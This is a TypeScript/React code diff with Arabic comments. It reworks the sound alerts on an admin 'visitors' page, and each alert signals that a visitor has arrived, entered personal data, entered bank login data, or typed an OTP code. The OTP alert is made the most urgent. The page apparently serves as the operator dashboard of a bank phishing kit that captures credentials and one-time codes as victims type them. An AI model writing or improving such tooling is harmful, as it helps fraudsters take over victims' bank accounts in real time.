@@ -56,7 +56,7 @@ function isReallyActive(session: { isActive: boolean; lastSeenAt: string }): boo
   return session.isActive && diff < 35000;
 }
 
-// ─── Singleton AudioContext للصوت ────────────────────────────────────────────
+// ─── نظام الإشعارات الصوتية ────────────────────────────────────────────────
 let _audioCtx: AudioContext | null = null;
 
 function getAudioCtx(): AudioContext | null {
@@ -67,24 +67,91 @@ function getAudioCtx(): AudioContext | null {
   } catch { return null; }
 }
 
-function playBeeps(frequency: number, times: number, volume = 0.25) {
+// ─── أنواع الأصوات ────────────────────────────────────────────────────────
+// 1. زائر جديد: صوت خافت ترحيبي (دافئ)
+// 2. بيانات شخصية: نغمة مزدوجة متوسطة (اعتراف)
+// 3. بيانات البنك: نغمة مزدوجة حادة (انتباه)
+// 4. رمز OTP: صوت حاد متتالي (تنبيه قوي)
+
+function playSound(type: "visitor" | "personal" | "bank" | "otp", volume = 0.3) {
   const ctx = getAudioCtx();
   if (!ctx) return;
+
   const doPlay = () => {
-    for (let i = 0; i < times; i++) {
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.type = "sine";
-      osc.frequency.value = frequency;
-      const start = ctx.currentTime + i * 0.28;
-      gain.gain.setValueAtTime(volume, start);
-      gain.gain.exponentialRampToValueAtTime(0.001, start + 0.22);
-      osc.start(start);
-      osc.stop(start + 0.22);
+    switch (type) {
+      case "visitor": {
+        // صوت ترحيبي خافت - مثل نغمة دافئة
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.type = "sine";
+        osc.frequency.setValueAtTime(523, ctx.currentTime); // C5
+        osc.frequency.setValueAtTime(659, ctx.currentTime + 0.15); // E5
+        gain.gain.setValueAtTime(0, ctx.currentTime);
+        gain.gain.linearRampToValueAtTime(volume * 0.6, ctx.currentTime + 0.05);
+        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
+        osc.start(ctx.currentTime);
+        osc.stop(ctx.currentTime + 0.4);
+        break;
+      }
+      case "personal": {
+        // نغمة مزدوجة متوسطة - "تم الاستلام"
+        for (let i = 0; i < 2; i++) {
+          const osc = ctx.createOscillator();
+          const gain = ctx.createGain();
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.type = "sine";
+          osc.frequency.value = 587; // D5
+          const start = ctx.currentTime + i * 0.25;
+          gain.gain.setValueAtTime(0, start);
+          gain.gain.linearRampToValueAtTime(volume * 0.8, start + 0.03);
+          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.2);
+          osc.start(start);
+          osc.stop(start + 0.2);
+        }
+        break;
+      }
+      case "bank": {
+        // نغمة مزدوجة حادة - "انتباه مهم"
+        for (let i = 0; i < 2; i++) {
+          const osc = ctx.createOscillator();
+          const gain = ctx.createGain();
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.type = "triangle";
+          osc.frequency.value = 784; // G5
+          const start = ctx.currentTime + i * 0.2;
+          gain.gain.setValueAtTime(0, start);
+          gain.gain.linearRampToValueAtTime(volume, start + 0.02);
+          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.18);
+          osc.start(start);
+          osc.stop(start + 0.18);
+        }
+        break;
+      }
+      case "otp": {
+        // صوت حاد متتالي - "تنبيه قوي!"
+        for (let i = 0; i < 4; i++) {
+          const osc = ctx.createOscillator();
+          const gain = ctx.createGain();
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.type = "sawtooth";
+          osc.frequency.setValueAtTime(880 + i * 50, ctx.currentTime + i * 0.12); // تصاعدي
+          const start = ctx.currentTime + i * 0.12;
+          gain.gain.setValueAtTime(0, start);
+          gain.gain.linearRampToValueAtTime(volume * 0.7, start + 0.02);
+          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.1);
+          osc.start(start);
+          osc.stop(start + 0.1);
+        }
+        break;
+      }
     }
   };
+
   if (ctx.state === "suspended") {
     ctx.resume().then(doPlay).catch(() => {});
   } else {
@@ -104,8 +171,7 @@ export default function AdminVisitorsPage() {
 
   // ─── تتبع الجلسات والطلبات المعروفة لتشغيل الأصوات صحيحاً ───────────────
   const seenSessionIds = useRef<Set<string>>(new Set());
-  const seenCredentialAppIds = useRef<Set<number>>(new Set());
-  const seenOtpAppIds = useRef<Set<number>>(new Set());
+  const seenAppIds = useRef<Set<number>>(new Set()); // لجميع أنواع الأحداث
   const sessionsInitialized = useRef(false);
 
   // تهيئة الجلسات المعروفة عند أول تحميل (لتجنب أصوات عند الدخول)
@@ -151,28 +217,34 @@ export default function AdminVisitorsPage() {
         try {
           const msg = JSON.parse(e.data);
 
-          // ── زائر جديد: نغمة واحدة عالية (880 Hz) ──
+          // ── زائر جديد: صوت ترحيبي خافت ──
           if (msg.type === "session_update" && msg.data?.id) {
             const sid = msg.data.id as string;
             if (!seenSessionIds.current.has(sid)) {
               seenSessionIds.current.add(sid);
-              if (soundsEnabledRef.current) playBeeps(880, 1);
+              if (soundsEnabledRef.current) playSound("visitor");
             }
             queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
           }
 
-          // ── بيانات دخول مُدخَلة: نغمتان متوسطتان (660 Hz) ──
+          // ── تحديث بيانات الطلب ──
           if (msg.type === "application_update" && msg.data) {
-            const app = msg.data as { id?: number; bankUsername?: string; otpCode?: string; sessionId?: string; applicantName?: string };
-            if (app.bankUsername && app.id && !seenCredentialAppIds.current.has(app.id)) {
-              seenCredentialAppIds.current.add(app.id);
-              if (soundsEnabledRef.current) playBeeps(660, 2);
+            const app = msg.data as {
+              id?: number;
+              sessionId?: string;
+              applicantName?: string;
+              eventType?: "personal" | "bank" | "otp";
+            };
+
+            // ── تشغيل الصوت حسب نوع الحدث ──
+            if (app.id && app.eventType && soundsEnabledRef.current) {
+              const isNewApp = !seenAppIds.current.has(app.id);
+              if (isNewApp) {
+                seenAppIds.current.add(app.id);
+                playSound(app.eventType);
+              }
             }
-            // ── رمز OTP مُدخَل: ثلاث نغمات منخفضة (440 Hz) ──
-            if (app.otpCode && app.id && !seenOtpAppIds.current.has(app.id)) {
-              seenOtpAppIds.current.add(app.id);
-              if (soundsEnabledRef.current) playBeeps(440, 3);
-            }
+
             // ── تحديث اسم العميل فوراً في صفحة الزوار ──
             if (app.sessionId && app.applicantName) {
               setRealtimeNames(prev => ({
